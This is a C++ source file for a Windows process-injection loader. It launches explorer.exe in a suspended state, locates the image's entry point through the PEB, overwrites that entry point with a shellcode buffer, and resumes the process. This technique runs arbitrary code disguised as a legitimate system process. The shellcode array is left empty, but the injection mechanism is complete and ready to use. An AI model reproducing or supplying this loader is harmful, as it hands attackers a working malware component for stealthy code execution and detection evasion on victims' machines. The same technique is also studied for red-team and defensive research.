#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "ntdll")
using fNtQueryInformationProcess = NTSTATUS(NTAPI *) (
	HANDLE           ProcessHandle,
	DWORD			 ProcessInformationClass,
	PVOID            ProcessInformation,
	ULONG            ProcessInformationLength,
	PULONG           ReturnLength
);

typedef struct _PROCESS_BASIC_INFORMATION { 
	PVOID Reserved1; 
	PVOID PebBaseAddress; 
	PVOID Reserved2[2]; 
	ULONG_PTR UniqueProcessId; 
	PVOID Reserved3; 
} PROCESS_BASIC_INFORMATION;

int main() {
	PIMAGE_DOS_HEADER idh;
	PIMAGE_NT_HEADERS ntHeaders;
	DWORD_PTR pebOffset;
	LPVOID imageBase, codeEntry;
	BYTE headerBuff[4096];
	PROCESS_BASIC_INFORMATION pbi;
	STARTUPINFOA si = {};
	PROCESS_INFORMATION pi;
	char binpath[] = "C:\\Windows\\explorer.exe";
	LPSTR lpbinpath = _strdup(binpath);

	unsigned char shellcode[] = "";
	
	// Create a remote process
	if (!CreateProcessA(0, lpbinpath, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi)) {
		return EXIT_FAILURE;
	};

	HANDLE hProc = pi.hProcess;
	printf("PID: %d\n", pi.dwProcessId);

	// address of NtQueryInformationProcess from ntdll
	fNtQueryInformationProcess myNtQueryInformationProcess = (fNtQueryInformationProcess)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationProcess"));
	
	// Ask for PROCESS_BASIC_INFORMATION
	myNtQueryInformationProcess(hProc, 0, &pbi, sizeof(PROCESS_BASIC_INFORMATION), 0);
	
	// Get peb offset and image base address
	pebOffset = (DWORD_PTR)pbi.PebBaseAddress + 0x10;
	imageBase = 0;

	ReadProcessMemory(hProc, (LPCVOID)pebOffset, &imageBase, sizeof(LPVOID), 0);
	ReadProcessMemory(hProc, (LPCVOID)imageBase, &headerBuff, sizeof(headerBuff), 0);

	// Get PE first section: Dos Header
	idh = (PIMAGE_DOS_HEADER)headerBuff;

	// Get Nt Headers
	ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)headerBuff + idh->e_lfanew);
	
	// Retrieve code section EntryPoint
	codeEntry = (LPVOID)(ntHeaders->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)imageBase);

	// Overwrite code section from entry point address
	WriteProcessMemory(hProc, codeEntry, shellcode, sizeof(shellcode), NULL);
	
	// Resuming execution
	ResumeThread(pi.hThread);

	return EXIT_SUCCESS;
}